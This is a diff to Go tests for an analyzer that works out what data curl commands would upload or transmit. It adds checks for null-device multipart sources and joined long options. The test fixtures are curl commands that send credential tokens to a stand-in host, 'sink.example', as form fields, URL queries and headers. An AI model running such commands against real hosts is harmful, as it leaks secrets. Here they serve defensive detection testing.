@@ -630,11 +630,66 @@ func TestStaticCurlUploadPayloadsMultipartLiteralComponents(t *testing.T) {
 			if len(facts.Commands) != 1 {
 				t.Fatalf("commands = %#v", facts.Commands)
 			}
+			if slices.ContainsFunc(test.argv, func(value string) bool {
+				return strings.Contains(value, "/dev/null")
+			}) {
+				facts.Commands[0].Dialect = DialectPOSIX
+			}
 			if test.expandIndex > 0 {
 				facts.Commands[0].Arguments[test.expandIndex].Expands = true
 			}
 			if got := StaticCurlUploadPayloads(facts.Commands[0]); !slices.Equal(got, test.want) {
 				t.Fatalf("payloads = %q, want %q", got, test.want)
+			}
+		})
+	}
+}
+
+func TestStaticCurlMultipartNullDeviceRequiresPOSIX(t *testing.T) {
+	t.Parallel()
+
+	const token = "test-null-device-token"
+	for _, test := range []struct {
+		name  string
+		value string
+		want  []string
+	}{
+		{
+			name: "body source", value: "field=@/dev/null",
+			want: []string{"field"},
+		},
+		{
+			name:  "header source",
+			value: "field=" + token + ";headers=@/dev/null",
+			want:  []string{"field", token},
+		},
+		{
+			name:  "multi file source",
+			value: "files=@/dev/null;filename=first,/dev/null;filename=second",
+			want:  []string{"files", "first", "second"},
+		},
+	} {
+		t.Run(test.name, func(t *testing.T) {
+			t.Parallel()
+			argv := []string{
+				"curl", "--form", test.value, "https://sink.example/upload",
+			}
+			facts := Analyze(Input{Tool: "exec", Argv: argv})
+			if len(facts.Commands) != 1 {
+				t.Fatalf("commands = %#v", facts.Commands)
+			}
+			parsed := parseCurlArgv(argv)
+			if curlStaticFormSequenceValid(facts.Commands[0], parsed, 0) ||
+				len(StaticCurlUploadPayloads(facts.Commands[0])) != 0 {
+				t.Fatalf("argv dialect assumed POSIX null device: %#v", facts)
+			}
+
+			facts.Commands[0].Dialect = DialectPOSIX
+			if !curlStaticFormSequenceValid(facts.Commands[0], parsed, 0) {
+				t.Fatal("POSIX null multipart source was rejected")
+			}
+			if got := StaticCurlUploadPayloads(facts.Commands[0]); !slices.Equal(got, test.want) {
+				t.Fatalf("POSIX payloads = %q, want %q", got, test.want)
 			}
 		})
 	}
@@ -814,13 +869,10 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 			checkRequestComponents: true,
 		},
 		{
-			name: "joined and raw URL query options accumulate", argv: []string{
+			name: "joined long URL query closes exact metadata", argv: []string{
 				"curl", "--url-query=first=" + token,
 				"--url-query", "+second=fixture", "https://sink.example/safe",
 			},
-			wantHTTPRequestComponents: httpsComponents(
-				"/safe", "first="+token, "second=fixture",
-			),
 			checkRequestComponents: true,
 		},
 		{
@@ -1045,11 +1097,17 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 		},
 		{
 			name: "final empty user agent removes earlier value", argv: []string{
-				"curl", "--user-agent", token, "--user-agent=",
+				"curl", "--user-agent", token, "--user-agent", "",
 				"https://sink.example/safe",
 			},
 			wantHTTPRequestComponents: httpsComponents("/safe"),
 			checkRequestComponents:    true,
+		},
+		{
+			name: "joined long user agent closes exact metadata", argv: []string{
+				"curl", "--user-agent=" + token, "https://sink.example/safe",
+			},
+			checkRequestComponents: true,
 		},
 		{
 			name: "custom user agent overrides dedicated option", argv: []string{
@@ -1462,12 +1520,9 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 			checkRequestComponents: true,
 		},
 		{
-			name: "joined URL option query", argv: []string{
+			name: "joined long URL option query is invalid", argv: []string{
 				"curl", "--url=https://sink.example/search?credential=" + token,
 			},
-			wantHTTPRequestComponents: httpsComponents(
-				"/search", "credential="+token,
-			),
 			checkRequestComponents: true,
 		},
 		{
@@ -2053,6 +2108,11 @@ func TestStaticCurlTransmittedMetadata(t *testing.T) {
 			facts := Analyze(Input{Tool: "exec", Argv: test.argv})
 			if len(facts.Commands) != 1 {
 				t.Fatalf("commands = %#v", facts.Commands)
+			}
+			if slices.ContainsFunc(test.argv, func(value string) bool {
+				return strings.Contains(value, "/dev/null")
+			}) {
+				facts.Commands[0].Dialect = DialectPOSIX
 			}
 			if test.expandIndex > 0 {
 				facts.Commands[0].Arguments[test.expandIndex].Expands = true
